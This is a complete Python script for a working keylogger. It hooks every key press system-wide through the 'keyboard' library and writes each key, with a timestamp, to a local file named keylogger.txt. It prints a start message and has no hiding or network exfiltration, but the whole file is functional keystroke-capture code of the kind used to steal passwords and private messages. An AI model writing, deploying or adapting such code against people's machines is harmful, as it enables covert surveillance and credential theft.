import keyboard
import time
import logging

class Keylogger:
    def __init__(self, filename="keylogger.txt"):
        self.filename = filename
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.INFO)
        file_handler = logging.FileHandler(self.filename)
        file_handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
        self.logger.addHandler(file_handler)

    def on_press(self, event):
        self.logger.info(event.name)

    def start(self):
        keyboard.on_press(self.on_press)
        print("Keylogger started. Press Ctrl+C to stop.")
        try:
            while True:
                time.sleep(0.1) 
        except KeyboardInterrupt:
            self.logger.info("Keylogger stopped.")
            keyboard.unhook_all()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()